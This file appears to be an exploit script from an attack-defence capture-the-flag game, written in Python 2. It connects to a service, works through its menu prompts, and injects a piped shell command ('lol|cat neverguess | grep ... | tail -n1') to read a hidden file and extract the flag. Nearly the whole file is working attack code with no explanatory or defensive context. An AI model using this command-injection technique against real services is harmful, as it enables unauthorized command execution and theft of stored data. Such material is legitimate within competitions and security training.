# -*- coding: utf-8 -*-

class Exploit():
  def execute(self, ip, port, flag_id):
    import socket
    import cPickle
    import base64
    import marshal
    import random
    import time
    import datetime

    flag = ''
    error = 0
    error_msg = ''
 
    try:
      s = socket.socket()
      s.connect((ip,port))

      msg = s.recv(1024)
      s.send("1")
      msg = s.recv(1024)
      s.send(flag_id)
      msg = s.recv(1024)
      s.send("lol|cat neverguess | grep \"%s\" | tail -n1"%flag_id)
      msg = s.recv(1024)
      flag = msg.split('\n')[-2]
    except Exception as e:
      error = 42
      error_msg = str(e)

    self.flag = flag
    self.flag_id = flag_id
    self.error = error
    self.error_msg = error_msg

  def result(self):
    return {'FLAG' : self.flag,
	    'ERROR' : self.error,
	    'ERROR_MSG' : self.error_msg,
	   }
